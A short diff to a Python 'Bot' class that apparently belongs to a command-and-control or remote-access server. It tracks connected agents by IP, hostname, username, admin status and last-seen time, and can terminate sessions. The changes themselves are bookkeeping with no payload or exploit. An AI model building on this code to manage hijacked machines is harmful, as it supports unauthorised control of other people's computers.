@@ -24,10 +24,14 @@ class Bot:
     def __init__(self, target, ip):
         self.target = target
         self.ip = ip
-        self.alias = "bot"
+        self.alias = f"Agent_{Bot.botCount}"
         self.id = Bot.botCount
         self.connected_time = datetime.now()
-        self.os_type = getattr(target, 'os_type', 'Unknown')  # Get OS type from socket if available
+        self.os_type = "Unknown"
+        self.hostname = "Unknown"
+        self.username = "Unknown"
+        self.is_admin = False
+        self.last_seen = datetime.now()
         Bot.botList[self.id] = self
         Bot.botCount += 1
         logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")
@@ -176,3 +180,6 @@ class Bot:
         except Exception as e:
             logging.error(f"Error terminating Session {self.id}: {e}")
             return f"Error terminating session: {e}" 
+
+    def update_last_seen(self):
+        self.last_seen = datetime.now() 
